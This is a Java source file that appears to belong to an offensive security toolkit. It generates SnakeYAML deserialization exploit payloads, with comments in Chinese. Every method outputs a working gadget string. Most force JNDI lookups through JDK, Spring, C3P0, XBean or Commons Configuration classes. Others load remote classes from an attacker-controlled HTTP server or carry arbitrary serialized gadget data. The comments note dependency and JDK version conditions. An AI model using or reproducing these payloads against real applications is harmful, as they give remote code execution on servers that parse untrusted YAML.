package com.xyuxu.javasec.core.generator;

public class SnakeYamlPayloadGenerator {

    // ==========================================
    // 1. JDK / Standard Payloads
    // ==========================================

    /**
     * Payload: JdbcRowSetImpl (JNDI)
     * 依赖: JDK < 8u191 (或绕过)
     */
    public static String generateJdbcRowSetImpl(String jndiUrl) {
        return String.format("!!com.sun.rowset.JdbcRowSetImpl\n" +
                " dataSourceName: %s\n" +
                " autoCommit: true", jndiUrl);
    }

    /**
     * Payload: ScriptEngineManager (SPI)
     * 依赖: 无 (JDK 自带), 走 HTTP 协议加载类
     * 注意: 需要出网 HTTP
     */
    public static String generateScriptEngineManager(String ip, int port) {
        String remoteUrl = "http://" + ip + ":" + port + "/";
        return String.format("!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"%s\"]\n" +
                "  ]]\n" +
                "]", remoteUrl);
    }

    /**
     * Payload: Sun MarshalOutputStream (Remote Class Loading)
     * 依赖: JDK 自带 (sun.rmi.server), 利用 RMI 机制加载远程类
     * 限制: 需要 JDK 版本支持且未禁用 RMI 加载
     */
    public static String generateMarshalOutputStream(String remoteUrl) {
        // remoteUrl 必须是 http://ip:port/ 格式
        return String.format("!!sun.rmi.server.MarshalOutputStream [\n" +
                "  !!java.util.zip.InflaterOutputStream [\n" +
                "    !!java.io.FileOutputStream [!!java.io.FileDescriptor []],\n" +
                "    !!java.util.zip.Inflater {\n" +
                "      input: !!java.net.URLClassLoader [[\n" +
                "        !!java.net.URL [\"%s\"]\n" +
                "      ]]\n" +
                "    }\n" +
                "  ]\n" +
                "]", remoteUrl);
    }

    // ==========================================
    // 2. Spring Framework Payloads
    // ==========================================

    /**
     * Payload: Spring PropertyPathFactoryBean (JNDI)
     * 依赖: spring-beans
     */
    public static String generateSpringPropertyPath(String jndiUrl) {
        return String.format("!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n" +
                " targetBeanName: %s\n" +
                " propertyPath: foo\n" +
                " beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n" +
                "  shareableResources: [\"%s\"]", jndiUrl, jndiUrl);
    }

    /**
     * Payload: Spring JtaTransactionManager (JNDI)
     * 依赖: spring-tx, spring-context
     * 原理: setUserTransactionName -> lookup
     */
    public static String generateSpringJtaTransactionManager(String jndiUrl) {
        return String.format("!!org.springframework.transaction.jta.JtaTransactionManager\n" +
                " userTransactionName: %s", jndiUrl);
    }

    // ==========================================
    // 3. C3P0 Payloads
    // ==========================================

    /**
     * Payload: C3P0 JndiRef (JNDI)
     * 依赖: c3p0
     */
    public static String generateC3P0Jndi(String jndiUrl) {
        return String.format("!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n" +
                " jndiName: %s\n" +
                " loginTimeout: 0", jndiUrl);
    }

    /**
     * Payload: C3P0 Wrapper (Hex序列化数据)
     * 依赖: c3p0
     * 威力: 可以加载 CommonsCollections 等原生反序列化 Payload
     * @param hexPayload 恶意的序列化数据的十六进制字符串 (Gadget生成的 Hex)
     */
    public static String generateC3P0Hex(String hexPayload) {
        return String.format("!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n" +
                " userOverridesAsString: 'HexAsciiSerializedMap:%s;'", hexPayload);
    }

    // ==========================================
    // 4. Other Libraries (Commons, XBean)
    // ==========================================

    /**
     * Payload: XBean Context (JNDI)
     * 依赖: Apache XBean (xbean-naming)
     */
    public static String generateXBean(String jndiUrl) {
        // XBean 的利用通常是利用 ContextUtil 创建 ReadOnlyContext
        // 注意：这里的 URL 通常是指向 Factory 的 codebase，或者直接是 JNDI URL
        return String.format("!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyContext [\n" +
                "  !!javax.naming.Reference [\n" +
                "    \"foo\",\n" +
                "    \"foo\",\n" +
                "    \"%s\"\n" +
                "  ]\n" +
                "]", jndiUrl);
    }

    /**
     * Payload: Commons Configuration (JNDI)
     * 依赖: commons-configuration 1.x
     */
    public static String generateCommonsConfiguration(String jndiUrl) {
        return String.format("!!org.apache.commons.configuration.JNDIConfiguration\n" +
                " prefix: %s", jndiUrl);
    }

    /**
     * Payload: Commons Configuration 2 (JNDI)
     * 依赖: commons-configuration2
     */
    public static String generateCommonsConfiguration2(String jndiUrl) {
        return String.format("!!org.apache.commons.configuration2.JNDIConfiguration\n" +
                " prefix: %s", jndiUrl);
    }
}